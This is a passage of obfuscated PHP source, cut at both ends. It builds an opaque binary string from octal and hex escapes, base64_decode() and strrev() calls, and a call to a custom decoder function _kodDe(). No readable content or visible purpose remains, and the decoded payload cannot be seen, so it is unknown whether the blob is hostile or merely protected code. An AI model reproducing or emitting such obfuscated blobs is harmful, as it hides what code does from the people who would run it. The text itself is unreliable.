v{âÆƒâ~ÿ').strrev('¸äA÷?§¾àv½bx¾»¥®î¸Zg©ú|jcäü~¿ï¬¿óä±ŸnF»òò¼¾')."\33\336\371\322\372\241\251\77\136\371\304\227\267\155\177\366\301\203\277\275\364\320\263\367\156\51\34\336\145\331\363\272\36\333\372\340\242\337\144\272\336\270\342\222\3\76\123\167\376"."\x3\x37\x8f\x3c\xb5\xa6\xf5\x27\xc9\xae\x55\x67\xce\x6f\xde\x7e\xfa\xbb\xdd\x53\x4f\xef\xbb\x7f\xa2\xff\xf9\x96\xfc\x91\x57\xb7\x1f\xf5\x46\xef\xbe\x9f\x3b\xef\xc4\x11\xf3\x4f\x5f\xda\xf7\xc1\x4b".base64_decode('2g4/N3Jyaezac/bcc9JXU7Peu7Mr9/2ZPwrsPXrGH77ylfgdjwdWv/vdfxx52awrbw==')."\x99\xe1\xfe\xf8\x33\xf9\x97\x3b\x6e\x5d\x7f\x63\x64\xfc\x8d\x3f\x1f\x3f\xfa\xda\x15\xc6\x35\x5f\xfc\x7e\xfd\xc5\x97\x7c\xe1\xf5\x87\x3e\xfb\xb9\xaf\x37\xd5\xd7\x3f\x77\xde\x85\xa5\xaf\x7d\x76\xe6"."\353\67\165\335\264\345\220\225\373\316\377\305\51\327\175\367\336\47\37\16\336\171\364\214\245\357\165\75\335\326\375\233\71\277\375\105\343\107\237\173\347\254\5\137\230\363\315\113\43".base64_decode('U00Z+8fz+kYPH3k/t0UfSZb2/aB48TWLojeed1167/JLh2kz5t389vwP3rfveqH1tw==')."\307\4\177\271\370\326\322\236\227\127\335\62\366\160\371\370\127\17\65\33\363\165\233\16\110\355\274\141\115\350\364\137\174\63\367\301\71\77\271\365\63\207\274\360\300\55\251\342\265"."\x27\xb6\xdf\xb6\x69\x61\xc9\xfc\xc5\x11\xa1\x6b\x37\x9e\xa0\xbf\x7a\xd6\x1b\x67\x8e\x1c\x74\x81\x7a\xe0\xf2\x3\xf\xd3\x2f\x4c\xbd\x78\xf5\x3\xcf\x2c\xbd\xfa\x17\x4d\xe5\x2f\xff\x29\x7f\xc8\x9f"."\x9e\x5e\x73\x58\xf3\xf5\x6b\x1f\xdf\x6f\x60\xd9\x8b\x73\x6e\x77\xb6\xdd\xd0\xb2\xd3\x9e\x7c\xb2\x3d\x1d\x7f\xe5\xd2\xc1\x3b\x3b\x4f\xdf\xf8\x52\xfb\x61\x49\xe5\x85\x4b\x5f\x6e\x5e\xfc\xf8\xa1\x9f"."\x59\xf1\x6a\xf0\xd9\x43\xaf\xdf\x70\xc0\x2f\xdb\xaf\xfd\xf0\x95\xe3\x8f\x58\xfd\xc3\x63\x9e\x7d\x7b\x2c\xd9\x67\x2d\x98\xfd\xd0\xa2\x33\x5f\xcb\xed\xfb\xd8\x55\xdf\x3e\xef\xb8\x7d\x8e\xc\xa5\xbb".base64_decode('9znm5dPP2PDXS9Yc+/z3njpm/a2BEy6fWnH6uTf86QeXL3r18Nfe77nl5uN++8Dlww==')."\77\76\360\207\312\5\377\365\342\133\177\173\161\362\336\125\333\53\43\3\337\171\364\360\373\156\117\134\270\255\355\266\47\6\333\267\27\57\376\373\7\303\117\317\310\357\367\116\246".strrev('ûş·ÛÃ§òı'."\r".'ßIïAøW^g’[z%¿‰ú}è~çP®û¶†àÍäogtü?^â„ë')."\xbe\x89\x87\x82\x57\x7d\xfa\x57\x6b\x77\x1f\xbb\x62\xee\x92\xc2\x2f\x8f\x3b\xe8\xfe\x45\xbf\x3b\xf4\xab\x7f\x3b\xe3\xd0\xd2\xad\xc3\xea\xd5\xc7\x7e\x2b\xbc\xe6\xef\x6f\x3b\xff\x7c\x74\xe0\xb1\xa7".base64_decode('wp9ftWv3595++uWtR+47o++es4ZDj+95fcGvQh/968lbVp/2yOS/3//r9uQjEx+9/g==')."\xd6\xdf\xfe\x38\xb6\x7d\xfd\x69\x13\x1f\xfd\x55\xdd\x7d\xdc\x43\xf7\xfd\xe3\x7d\xeb\xdb\x61\x75\xe0\xa3\x77\x57\xff\x7e\xc7\xe3\xf\xb7\xed\x3a\xe6\x91\xff\x3c\xbb\x74\xed\xbf\xd6\x3e\x63\x4d\x4e".base64_decode('Xdd4ZLr3iMjVleP1vb7yXPtJ1z/2yoFXrFj789zWz/9u3t7HfM2sZI/bO3tU/qr7Cw==').base64_decode('Fw3/6ZGRG+/60cjZ52zeP33VvZdue/aSVPw7a8rPHHh0quHnO0IvvPLtLR0zF3zqlg==').base64_decode('A77XcuqVE0Pma+OvffTQ+l+cs98V4cBxvwo+9Zfi7+8e/nlz8pktnX8/Vj3uF3vtuA==')."\xe3\xe7\xeb\xb7\x6f\xdd\x38\x9e\x3e\xef\x2\xf5\x9c\xe2\xe7\xb7\x3c\xfa\xd0\xb\x7\x77\xfc\xe8\x88\xca\xbc\x8b\x3e\xbb\x2a\xd7\xfc\x83\xaf\xdc\x79\xe6\xa2\x97\x86\x4e\x3d\xa4\xa3\xef\x88\x73\xeb"."\xe\xff\xa0\xa1\xa8\xf7\x9f\x7b\x5f\xf1\xb7\x97\xe6\xd6\x1e\xbb\xe9\xbd\x87\xb3\x37\x7f\xea\xea\xb3\xe\xea\x7e\xe9\x53\x59\xe5\x9d\xd2\x97\xf7\xbc\xbf\x76\x72\xe5\x87\x1d\x3f\xef\xfc\xc2\x95\xc5".base64_decode('d0qPvPb4S8Gdz7/y9y8/9PkzFjvHD9w6+yjnZ7e+dd5hPf/lNt7Y8vWPHlcOe/Lu6w==')."\x26\x4f\x7b\xf0\x5b\xa7\x3f\x7b\x57\x34\xb8\x27\xd3\xfa\xec\xbf\x3a\x47\x3e\xbc\x75\x4d\xf9\x9f\x6f\xdc\xbd\xfe\xae\xbe\x37\x7f\xeb\x5c\x7f\xfe\x7\xce\xfb\xef\xbc\x96\xfa\xd9\x17\x93\xdf\x7b\xe3"."\355\374\155\67\156\272\173\362\350\107\237\32\157\331\155\132\267\25\107\203\57\376\371\35\347\167\157\207\236\372\325\305\67\127\126\176\320\170\164\217\176\320\246\206\227\216\276\47\332"."\377\341\363\217\135\162\344\255\33\277\173\353\327\237\72\343\266\237\45\337\276\343\372\237\204\16\76\343\342\211\167\367\273\162\237\127\224\173\226\353\333\106\267\225\7\77\72\166\345"."\27\177\72\372\132\366\204\251\276\143\357\270\71\364\347\317\17\37\62\165\160\327\15\201\73\132\265\137\35\376\203\117\237\175\166\373\326\312\337\156\255\77\376\37\107\235\375\353\77".strrev('ƒùüßEÍêúÿÕûuÙAæÿïúÑí£¯ü¼?n\'®ê¾~;´ö9n/¥‡S]óğ').strrev('u¬§eàá›ş2~–ØŞs>{±“ãn»_›Å`o}ÜïsqğxŸï›ôxy6h´Fç3')."\173\247\56\260\140\377\333\47\357\170\145\352\113\217\175\277\350\274\372\333\150\242\327\335\366\102\323\342\313\16\217\134\176\360\176\257\356\63\357\275\322\262\47\327\177\313\74\342\247"."\x2b\xd7\xe9\x37\xed\xa\xbf\x35\xd6\x71\xf9\x15\xbf\xbe\xeb\x86\x1f\x5d\x70\x57\xe0\xd9\xf3\xde\xb8\x79\x9f\x35\x67\x9f\xbb\xf5\xc2\x2d\x2d\x61\x2d\xf4\xec\x86\xba\xd2\x8b\x37\xb7\x34\x6f\xfd\xf7"."\305\67\337\371\126\152\356\275\57\137\272\344\305\247\256\252\24\336\154\70\360\305\177\274\272\41\373\116\303\356\333\276\372\320\300\222\347\377\127\350\336\47\12\251\237\114\336\326\167".base64_decode('3KZ/lvN3frfl7aOePuvt77W0HVnedscV4eKfM3+84e7/3vJGduWNtz/6u79fcG7ppQ==')."\xcb\xdf\xfc\x4a\x62\x47\xfa\xe7\x5d\xee\xd7\xf5\x2f\x3e\xf0\xaf\x97\x2e\xdc\xff\xaf\xd6\x15\xa7\xad\xb2\x1b\x7f\x1c\x8a\x3f\x30\xfb\xc6\x4f\xdd\x76\x83\xf2\xca\x5\xb7\x74\xdc\xfb\xe2\x67\x6f\xeb"."\xa8\xdf\xfe\xcc\x96\xd\x47\x3d\xbe\x7a\xc9\xfa\x6f\x3f\x37\x71\xcb\xeb\xeb\x32\xb3\x77\xac\x1f\x39\xf9\xe8\xc6\x75\x47\x6c\xed\x3b\xf4\xc2\x17\x82\x6f\x9d\x96\xfe\x7e\xe2\x77\x5b\x9e\xdc\xfd\x9f"."\207\306\77\330\371\323\277\54\173\360\237\257\377\176\367\161\247\126\76\172\344\225\253\116\173\377\335\235\313\321\232\172\377\57\326\372\51\373\243\77\155\275\43\244\266\155\76\365\277".base64_decode('r9n+2Cu/P+3+qb/99a8XHfbL0z48671vLHvoX28dt/qa0/75n/+c+rPZdzf8+i93Hg==')."\x7a\xc3\xa7\x4f\x5f\x94\x7d\xf8\xb2\xe4\x63\x75\xe3\x43\xff\xfe\xe5\x4b\x53\x6f\xff\xf9\xef\x67\xfc\x6a\xc1\xac\xe7\x4e\xd9\xec\xdc\x72\xe7\xc3\xcf\xfe\xe1\xe5\x91\xbb\x17\xf\xdc\x76\xef\x69\xe5"."\177\274\363\233\317\356\71\346\304\37\356\37\375\60\167\306\227\77\277\51\373\372\263\257\272\315\127\135\265\363\222\113\336\333\162\361\163\257\237\322\170\327\107\131\355\373\367\315\276"."\240\343\277\207\366\373\116\375\73\201\145\7\276\161\201\171\347\206\337\34\173\264\332\176\321\217\202\331\354\357\225\271\227\75\166\355\61\277\357\77\362\314\67\254\275\137\77\344\206"."\326\357\35\305\214\212\346\317\5\115\34\315\31\254\224\262\40\345\232\113\177\314\302\360\110\51\13\302\53\246\344\77\124\50\232\354\162\15\70\47\243\70\122\51\117\114\322\310\202"._kodDe('LQFXs+e8QEFNjMU3IaKNUpKr0bIH/GhHpxzFDBEpTa8IrSMJwgmOcvWNuqlXDssKDac=')."\55\166\44\230\64\65\253\314\244\373\320\330\340\370\244\125\50\102\347\206\321\161\100\313\303\361\163\334\36\63\264\111\70\135\314\133\260\10\172\321\4\43\55\347\306\106\46\164\30"."\351\174\150\155\310\321\255\254\313\354\15\66\242\257\151\5\6\65\30\353\102\30\344\234\71\320\342\334\371\13\40\300\0\273\240\31\240\64\352\30\303\25\27\40\274\140\36\244\266"."\314\201\12\33\213\132\266\354\0\20\233\27\100\166\141\343\204\225\265\101\342\66\351\224\66\216\14\303\220\155\255\62\76\72\6\347\251\171\354\153\166\101\33\314\72\46\3\62\200"."\x73\x7e\xb\x7c\x64\x72\x22\xef\x6c\x74\x41\x60\xb3\x70\x1e\xe8\x63\xe5\xec\x51\xa3\x52\x98\x60\x43\x81\xd4\xca\xb8\x53\x32\xd9\x21\x7b\x62\xd2\x1d\xcd\x8f\xc3\xa1\x64\xe1\x2\x68\x6e\xd0\xa9\x58".base64_decode('oyUYUlYrG/YE035jIGpuhunPaW42r8Onx3JWwSgDLhSKjjVmgmbvxoqZnRiFcxDroA==').base64_decode('NaINO8xSZ/5CGOvGieKIWwCIZfNO2RqGMcxlRSqlcVvLOtAa60pLUxMDG/119I2mOw==')."\xe\xdd\xc9\x97\x87\x6\x8b\xa3\xc\x55\x58\x17\x26\x36\xea\x43\xa5\x22\x53\x51\x2b\x4e\x16\xc\xd\xfa\x93\xab\x14\x86\xb9\x98\x63\x1e\x3b\x4d\x34\x33\x2c\x6a\x61\xf0\x9c\xb4\x47\x73\x7a\x5\x5a".base64_decode('MK1yfmwCpnIhQ5FK3tT03DBDHED7OfNgGodyxeHyCABq7jwYxCJWrqVlDvtkCxsfww==').strrev('hÖû@µqtÌ»y+5#®YŒ2sš1ì¬–ÄØQ…B¶P§9»IlÏ').strrev('¨te“èò¥fålL‹gb6:ààF–65–z7•²Z±f†hy2W!').base64_decode('ZS5bPEyjcMF8CCxsYmBvYfogE+OTozn4gOkUCyM5aHOo7IzmXTac4kh+jOFP83yozA==').strrev('ÑEÂ€L¯™¡E“º6ÍdO*^8Ù€'."\r".'ˆÒ±ÍFC¨0šHÁyã\\áf&').base64_decode('roxNMOqbmzSLQ2Nwq58bGi5qLizouU3wdW3UGZkowDgmJ0YLY26WgRoAMDls6MUCUA==')."\x8e\x5\x73\x20\x75\x4e\x33\xb4\x30\x36\x31\xe4\xe6\x4d\x46\xcf\xd8\x44\x19\xb9\xf1\xd1\xf2\x46\x20\x2a\xb\x19\x14\xb8\x96\x6b\xbb\x96\x1d\x61\x22\x68\x59\x55\x94\x1b\xc1\x99\xa1\x92\x66\x72\xd".base64_decode('nS4YXVa2ipALjOg6Uy2H4bpCBQRUUyHdKOlChE4vLVhNIR/AkhpJiQRH03IrWdOVsg==')."\121\314\223\233\166\55\233\253\255\120\205\270\20\356\141\110\36\352\332\22\323\353\255\161\373\11\142\143\307\31\263\30\2\214\130\271\154\321\252\344\74\255\346\6\75\155\362\124\46"."\320\360\347\344\247\111\107\355\170\224\273\131\232\7\130\203\144\322\124\71\22\142\340\36\224\46\224\312\365\135\315\31\11\311\311\101\71\327\60\121\57\212\305\220\327\206\127\45\177"."\30\216\23\73\121\7\253\102\233\342\256\334\31\221\0\217\215\157\373\172\325\114\44\275\102\322\32\304\306\241\14\235\124\241\310\57\15\113\264\40\301\121\236\101\57\10\30\206\354"."\331\376\340\316\157\134\262\353\342\73\166\155\273\175\347\3\27\355\271\375\216\235\17\137\214\242\73\356\73\177\347\355\127\277\171\331\226\35\367\155\333\161\337\127\367\234\365\303\277"."\74\164\336\316\157\154\337\363\365\207\167\136\171\323\316\353\317\332\361\340\303\173\36\71\153\367\115\133\167\334\167\333\256\53\317\331\271\345\236\35\17\136\262\363\354\153\167\236\365".strrev('*™jm‹ºå¹,%–:_îx›óÛîûÎÚúuÅ.ÛÎØ¨ËE³®ü¨•ğñÛm]')."\201\216\262\124\1\204\324\235\220\322\133\324\21\204\225\154\101\317\216\140\275\61\267\240\333\212\113\364\307\64\364\327\264\314\40\105\70\152\257\354\50\206\211\263\25\66\67\41\216"."\x94\x19\xbd\x54\xc6\xa8\x5\x50\xa\x53\x9b\x46\x8f\xc5\x80\x84\x7f\xb5\xc0\x4c\x33\x6a\xa0\x15\x86\xb5\x98\xab\x6\x1c\x84\x9b\x40\x2c\x7c\x54\xf2\x1a\x4a\xc8\xb5\x2a\x79\x54\x4d\x61\x76\x47\x8a"."\x6b\xb1\x70\x69\x82\x4f\xba\x6f\x11\xd4\x9c\x56\xde\xd\x36\xb5\x43\xfc\xe\x40\x88\xa6\xa1\x63\x92\x29\x8\xbd\xde\xa9\x42\x29\xb2\xaa\xbc\x24\xc1\xb3\xde\xbc\xc4\x44\xce\xf2\x42\x2\x64\xc7\x44".base64_decode('bSGg0K4EFHJZrXgNeLEaArval9eY3H1bLxf5RRUWv9YEotwb+abcN7R0DTDywXky0Q==')."\272\256\270\65\12\312\320\226\145\325\206\25\55\42\102\47\56\124\211\42\201\30\6\215\12\31\71\372\20\247\223\266\236\63\340\123\45\275\104\112\2\175\14\111\67\124\324\352\207".strrev('Aƒµ‹€Hr]£§‹ãÀ¿èµ9&+Ô–í™®L¼]Á'."\n".'ìe•–Km—=°rÑg]+').base64_decode('SdYstN1wCJoT19coLYZX9nTpHVzFAy35oSHdcVuJFaQyW0EdXRiagwJkcbSEFqAggQ==').base64_decode('GCzofoBixWGmOTND84ApdBaDfspiQlfapO5DuqhVQSxPKw+iIqmKiWe71Ttm3cxJlQ==')."\26\153\131\127\152\125\315\3\120\103\2\36\332\154\221\257\347\300\76\55\54\101\151\14\12\260\272\335\136\34\100\343\17\162\264\100\323\213\130\207\234\103\164\145\141\367\201\46\35".base64_decode('yYY8JTAKVyfg+piqrjzlZcSemFxJ1ilq7GLUwTYnps7xr+IISwEtD0azcVNOoWGsbg==')."\256\242\135\337\221\226\276\72\244\273\52\60\102\320\323\366\110\72\36\125\173\43\314\206\104\53\227\303\116\156\304\11\143\15\117\143\124\117\30\203\141\154\241\216\161\62\304\155\270".base64_decode('yX6gaoOW7TKIoZWi5gzoWiLernbEQYkz0htX0+mk9BFi6rpGXZHsUKPJ5Io4YDjMaQ==')."\253\104\220\261\225\240\270\123\307\61\141\55\210\57\250\144\215\72\231\343\301\16\33\360\256\236\126\100\363\24\55\245\150\127\44\305\365\375\133\102\115\241\71\242\54\372\240\212\315"."\36\332\230\161\170\72\23\111\325\160\333\101\335\171\300\174\203\13\17\250\320\225\134\255\104\223\211\276\356\236\64\365\126\101\323\173\222\122\76\321\352\206\154\346\324\243\72\33\232"."\x8f\xf5\x26\x22\xd1\x98\x12\xef\xc9\x24\x99\xd9\x6\x57\xac\x25\x6\x3b\x69\x1e\x67\x20\xb0\x1d\x9d\x3b\xed\x80\xfa\x34\x22\x1b\x15\xc9\x2d\xf2\x96\x60\x85\xac\xb\xd4\xf7\xd7\xf5\xcf\xea\x6f\xe8"."\157\334\20\352\167\6\200\226\221\31\61\344\351\201\110\157\7\14\257\225\207\162\354\344\337\235\116\257\4\43\303\144\52\22\115\260\256\40\224\203\140\62\32\247\201\335\337\272\163"."\xc7\x3\xe7\xef\xbe\xe2\xf6\x9d\xe7\x6c\x43\xd\xed\xba\xfc\x6b\xbb\xbe\x7d\xf\xe2\x88\x30\x17\x74\xfb\x79\xbb\x7f\x74\xfe\xae\x6f\x6d\xdf\x75\x1e\x70\x2f\xca\x9e\xed\xf7\xee\x78\xf8\x91\xdd\xdf"."\272\151\347\355\227\356\272\344\376\335\227\237\101\63\336\374\376\235\73\317\275\211\167\114\171\363\242\37\355\72\377\6\316\31\121\206\50\200\152\277\271\145\333\356\207\157\307\174\321"."\165\137\335\165\367\326\135\127\156\333\171\356\167\166\136\166\323\356\363\267\357\374\356\327\167\236\271\155\317\366\213\217\367\43\22\215\257\143\123\1\26\313\341\365\330\100\233\202\267".base64_decode('35mNQduIfhuwFQj6ZcrsRMF5ZV+sJxrzW1XJUfB4MotiCNXvASbWAY8pLE4cJ7TVTw==')."\333\213\51\230\177\251\123\122\147\72\142\351\150\52\336\36\3\73\3\76\121\63\11\33\7\152\37\50\65\235\132\305\303\334\116\264\312\103\215\322\300\220\271\121\361\14\104\13\145"."\255\142\245\144\222\316\52\165\130\361\254\56\200\111\11\61\361\122\352\360\126\215\22\364\54\132\172\15\330\255\5\321\123\256\137\133\37\150\12\314\151\124\300\175\15\255\1\116\153"."\224\72\120\167\347\365\74\37\11\14\172\142\163\2\115\215\112\135\171\244\16\372\45\340\212\172\257\322\222\216\242\5\32\240\303\162\167\105\131\104\62\35\327\326\14\104\65\225\154"."\200\47\361\372\350\327\343\210\46\33\22\65\350\74\241\22\376\64\45\322\323\341\55\111\375\327\364\326\23\65\321\154\310\345\376\61\330\64\327\67\52\203\140\275\121\43\223\124\363".strrev('B[ÀÄlğ'."\n".'<´944-ebÙÒ§'."\n".'¦JQ6Òİ£Üµ'."\n".'¦¦ùó—z\'@Ù†ŒÍ£'."\0".'')."\344\210\147\260\31\304\351\174\22\153\344\21\307\102\165\224\325\244\343\54\71\103\214\324\201\1\172\367\132\76\6\206\313\60\5\272\160\113\204\155\20\143\231\150\27\305\362\264\204"."\xe6\xb9\xc1\x99\x1e\x44\x15\xe0\x54\x3c\x28\xc2\xcf\x2b\x50\x8e\x2e\x17\x4c\x10\xe\x22\xe5\xe2\x3d\x9d\xc9\x54\x37\xb5\xbd\x4b\x47\xbb\x62\xdd\x91\x10\x10\x71\x8a\x9\xb4\x3c\x66\xe2\x94\x36\xa5".base64_decode('HlM+mlTvAT/5EANZhnwVrSvVRRwZhUJ5CDoDs68QS3qNVGmrp65AoEnuPyuZyqgIAA==').base64_decode('QJ4lqlsv7RaSTjs2IRtlB408YrEs5gElN8jcbKHGcZvRZE9nnJkZdsAxvszkW1CoIw==')."\25\307\216\44\340\373\12\153\112\62\356\104\21\241\144\202\42\345\261\34\17\13\367\0\70\203\357\371\50\42\266\174\24\341\233\15\56\45\371\3\303\337\117\367\360\260\340\242\121"."\244\57\315\314\113\60\365\135\335\301\303\135\334\30\34\147\44\123\122\44\222\212\164\247\171\64\265\232\233\253\360\64\152\266\242\366\364\165\13\212\237\210\254\102\310\222\144\360\146".base64_decode('x5zw+obQrGWN/dQSkAbpz0kshq2jBjbNCSjzNzdCGe4Twi0YJmNj8VdWJtREcjmNEw==')."\77\145\61\63\47\16\75\312\72\5\361\324\31\301\123\73\154\353\342\253\101\101\70\254\120\363\142\245\47\271\72\42\134\137\111\31\220\42\74\141\205\327\257\353\37\353\17\41\146"."\301\331\40\54\373\72\332\25\306\206\104\211\320\200\312\26\240\166\204\155\243\33\2\260\143\250\105\153\210\271\261\101\4\161\12\330\5\372\273\206\5\10\255\204\12\350\44\135\56"."\62\23\77\152\133\250\366\117\365\237\330\37\14\121\163\112\314\274\364\7\104\227\324\330\32\264\307\246\323\36\133\120\225\170\167\202\326\321\50\41\104\127\55\215\54\201\37\70\326"."\x2d\x1\xf6\x14\xa2\x4b\xdb\xf8\x64\xc6\x56\x4e\xf5\xa0\xbf\xcb\x33\x53\x31\xf4\x37\x81\x7e\x12\x19\x34\x5d\x6\x2f\x80\x96\x64\x22\xbe\x22\x36\x85\xff\x11\x19\x8d\x1c\x90\xd4\x6a\xca\x5b\x21\xde"."\x33\x85\xfe\x45\x4\x66\x2a\xde\xe3\x6f\xac\x3d\x96\x59\x1d\x8b\xd1\x2\x2c\xc\xbf\xa2\x28\x22\x38\x30\x54\xc9\x8f\x1d\x36\x61\x80\x6c\x61\xd2\x0\x4d\xab\x6a\x3\x1\x66\x70\x60\x76\xa3\xaa\x86"."\235\76\300\27\356\67\243\241\176\306\234\172\330\103\42\351\350\24\247\276\36\204\250\306\5\142\160\340\105\4\356\235\15\342\313\123\311\276\136\51\336\25\131\25\357\131\316\142\341"."\x59\x2c\x34\xb\x9a\x56\x3a\xe2\x69\x4\xa2\x28\x43\x46\xe1\x34\x4e\x8e\xd3\x30\x65\x8b\x64\xae\xd7\x83\xd2\x1d\x88\xb2\xa3\x88\xc4\xb2\xe3\xc3\x0\xa5\xcc\xde\x55\xd6\xde\x17\x4f\x74\xc8\xe6\xef"."\xb8\x20\xd\xcd\x24\x54\x1d\xf6\x94\x99\xac\x73\x2c\x4e\xc\xe1\x59\x4\x83\x9c\x85\x9\xba\xb1\x8\x81\x1\x8b\x50\x0\xb0\x18\x1\x17\x8b\x10\xe7\x74\x2c\x42\x6\xca\x22\xf8\x74\x12\xeb\x61\x79".base64_decode('6PiJjo7sTFnQRrn95uLcoORUA9PgEBXHYdcq6HCocaGpT+JKhF+STIEqJCqSGXmYJg==')."\x21\x6e\x93\x24\xa2\xdf\xfe\xd\xcb\x8\x37\xbc\x81\x21\x26\xb5\x55\x76\x33\x86\x5b\xf4\x7c\x5\x6c\x1a\xd1\x57\xe2\xc4\x90\x54\xfa\xe\x33\xfa\x20\xa2\x46\xd5\x92\xc4\xdd\x64\xa3\x96\x13\x84\x70"."\213\312\306\101\216\54\144\104\130\21\223\110\230\151\324\173\204\342\164\151\3\77\31\201\243\217\0\374\102\217\16\241\77\375\20\145\362\20\60\344\251\17\300\46\313\214\77\274\207"."\356\376\376\272\351\240\5\5\30\314\40\132\107\243\254\26\0\22\355\171\331\2\166\316\242\272\45\46\133\47\207\63\41\305\246\222\160\21\357\110\45\173\51\7\242\304\73\25\352"."\21\102\251\247\262\363\172\140\255\242\251\30\136\35\264\24\313\153\250\367\110\272\226\326\53\140\36\336\350\255\25\357\351\210\255\121\352\215\334\270\252\151\52\124\126\320\132\144\15"."\x29\x55\x2d\xb1\x16\x68\x5f\xe7\x42\xa4\x60\x8d\x29\x32\x7a\xb1\xf3\x72\x94\xa6\x65\x4\xca\x55\xb1\x66\xc4\xb7\x3\x33\xc5\xd\xc0\xa1\x9c\xe7\x50\x8e\x98\x66\xc5\xd3\x68\xc3\x4e\x24\xc8\x48\x51".base64_decode('luFgRjagcBcMOBEfPqg0FRpiGbQhmhVbk0lFcCLhPg8+CP0hBAWfjuySRu1TCc8W2g==').base64_decode('AEKCDR4WkTKPmEkEDCJbnjQmnkMkBRTMshxhBXDdNNabindHUmsBZOIMACvQKnqslA==')."\105\304\160\372\44\73\371\36\324\153\331\156\236\316\361\24\243\260\350\74\73\5\24\26\365\6\26\0\236\171\32\4\137\242\52\67\203\146\102\224\6\146\116\34\140\1\346\216\202"."\x98\x68\x31\x21\x58\x9\x91\x1c\x1e\x13\xb3\x6\xb8\xf\xb3\x22\xe7\xca\x46\x66\xc2\xd9\x29\xde\x24\xf1\x24\xc3\x2\x88\x75\x46\xfa\x12\x72\xa\x80\x4a\x59\x11\x5b\xfb\x31\x6b\x84\xf5\xb4\xd6\x1a"."\141\171\114\34\303\127\33\214\247\241\5\306\107\75\144\64\64\243\63\151\305\304\56\140\270\253\105\350\25\215\105\372\62\111\25\355\37\251\30\246\346\60\42\16\126\251\277\322\271"."\x5b\x9e\x14\x68\x6\x17\xe0\x9e\x63\x3f\x66\x68\xac\x4c\xad\xa1\xf1\xfa\x5c\xf2\x14\xeb\x59\x1e\xef\x89\xb5\x75\x4f\xc4\xd3\x91\x6e\x85\x75\x1c\x64\x6b\xd8\xc1\xe2\x42\x68\x27\x9e\x54\x13\x88\x27"."\126\145\361\131\74\11\362\143\217\273\76\125\25\136\126\102\232\120\116\167\355\212\344\311\315\260\210\42\170\67\267\31\41\232\353\10\41\42\302\273\2\227\161\223\274\312\40\256\55".base64_decode('b1dQ3+ck07BacQ4uTLmUxaK46vm4X9lbThZK6eKKmF1JcwdwUKFP8o6AKyvsg+SSyA==').base64_decode('9HYP7ZdF5tZJ1cVoSrrj8KticvhhQbcgnEPIPko72hnkKqab1osgsO8YJCr9wt5O2A==')."\64\111\252\376\344\336\105\114\7\165\27\347\253\10\55\305\371\170\245\122\42\61\41\234\222\342\153\16\321\346\0\73\302\213\101\116\32\154\147\363\137\30\362\116\232\126\257\156\227"."\xc\x72\xb7\xb3\x5a\x5c\xdd\xf0\x7c\x5d\x46\x80\x5a\x0\xe\xce\x91\xbe\x20\x19\x4d\xe2\x28\x4c\x24\xbe\xbc\x94\xec\x52\x2a\x26\xea\x57\x50\xb6\x74\x42\x13\x4b\x12\x25\xdb\xa\xe6\x23\x8f\xc6\x16".base64_decode('gI4QQh4IDEEK+7VZTkg4vyFtYt4lKJxR5DTZkFRyxX28PONk6gTi5Q3ZM0VI+GfluA==')."\174\22\7\70\66\260\206\33\167\314\7\347\125\251\57\275\274\174\226\73\342\246\320\220\300\114\22\150\220\254\76\245\125\164\242\13\365\324\262\47\44\34\220\122\273\231\277\46\360".base64_decode('DpuwgGPFxiG6C566PMQjnoS6IR1bWlG7F2wXxytS12ufXKlPcpA7zXqvWS8KBfkHbQ==')."\42\313\371\344\17\246\164\261\45\243\152\304\260\355\23\53\11\372\107\276\104\52\111\64\323\127\207\240\43\65\302\201\231\57\100\266\300\61\104\250\173\222\152\27\332\13\222\214\143"."\60\234\214\207\366\262\132\100\12\134\304\320\144\303\304\62\30\316\143\213\311\215\20\275\233\204\311\336\204\310\52\17\61\315\14\160\377\45\166\352\10\375\131\133\312\5\121\307\1".base64_decode('63K6y90uYWrGrChxnyXD6hKnfmOSP09tVMd2bEzaUaUgA0OpHhx0Ed9KpZN9KXZ1gg==')."\343\130\144\244\246\142\321\265\374\26\203\247\166\106\126\371\123\342\130\344\27\131\136\63\231\13\242\160\72\71\361\251\251\44\226\330\305\22\235\276\12\351\56\356\177\325\233\246\46"."\342\75\53\152\146\40\276\241\133\252\102\23\343\231\130\267\77\315\333\102\72\26\111\61\337\276\70\336\236\110\106\245\354\170\262\32\22\234\61\341\211\124\336\107\23\303\353\33\372"."\x37\x91\x23\x4b\x2b\x3a\xb9\xe4\xa6\xb0\x60\x20\xa8\xe\xcc\x6e\x5c\xd6\xbf\xb9\xb1\xa1\x3f\xbc\x2c\x34\x8b\xcb\xb3\x28\xb9\x92\x6c\x75\xa7\x49\x76\xd8\x26\xd2\xea\x4f\xc0\xfb\xf\x4b\xa4\xd5\x20"."\26\16\205\340\43\74\20\356\17\63\337\136\141\221\11\277\242\74\337\74\300\247\166\232\172\110\362\364\320\347\110\204\31\354\207\374\126\146\52\263\46\203\50\66\24\126\371\322\303"."\xb7\xa2\x6a\x7a\x6d\x9a\x4f\x92\x37\xcd\x83\x8a\x14\x99\x65\xd\x8\x5f\x61\xf4\xb7\x57\x2e\x8a\x95\x6e\x6a\x16\xf4\xe0\xb2\xc7\x38\x5a\x4e\xa\x19\x96\x58\x26\x62\x3d\xe7\xac\x6c\x5\xfb\x64\x12".base64_decode('kyNMqVFSyNMEouQj4vANyzHNlq2JNknYhaOIl1zeFT95RaK7J9m7MpXO9K1avWYtOA==')."\246\154\145\330\222\127\202\314\245\32\170\135\15\217\152\166\170\224\371\123\137\205\217\2\272\23\226\131\54\236\210\306\210\35\332\62\67\151\124\102\300\163\61\331\10\327\316\242\255"."\205\113\246\73\147\232\22\275\266\76\150\131\356\64\271\253\272\77\276\141\310\134\327\357\14\160\364\314\351\243\20\24\132\156\216\70\0\1\167\21\224\375\272\143\154\225\31\276\334"."\240\217\15\200\204\42\347\330\44\146\101\44\162\227\306\64\72\301\56\101\210\37\63\311\45\60\170\21\135\216\275\210\62\17\242\33\211\157\113\277\143\314\215\101\155\304\223\57\234".strrev('8Æ"wŸÜ2«c:‰>l(D-òê;x:Šà£d'."\n".'^Lxq`g¸5‰sî\'¢¢